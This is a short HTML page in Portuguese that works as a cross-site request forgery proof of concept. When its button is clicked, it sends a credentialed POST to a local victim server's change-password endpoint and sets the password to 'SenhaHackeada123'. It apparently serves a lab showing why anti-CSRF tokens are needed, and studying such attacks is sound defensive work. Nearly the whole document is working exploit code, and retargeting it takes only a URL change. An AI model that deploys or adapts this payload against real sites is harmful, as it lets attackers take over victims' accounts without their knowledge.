<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Ataque POST Inseguro</title></head>
<body>
<h2>Ataque POST sem token</h2>
<button id="attack">Executar ataque inseguro</button>
<p id="resultado"></p>

<script>
document.getElementById("attack").addEventListener("click", async () => {
  const response = await fetch("http://vitima.local:3001/api/change-password", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify({ password: "SenhaHackeada123" })
  });

  const data = await response.json();
  document.getElementById("resultado").textContent = JSON.stringify(data);
});
</script>
</body>
</html>
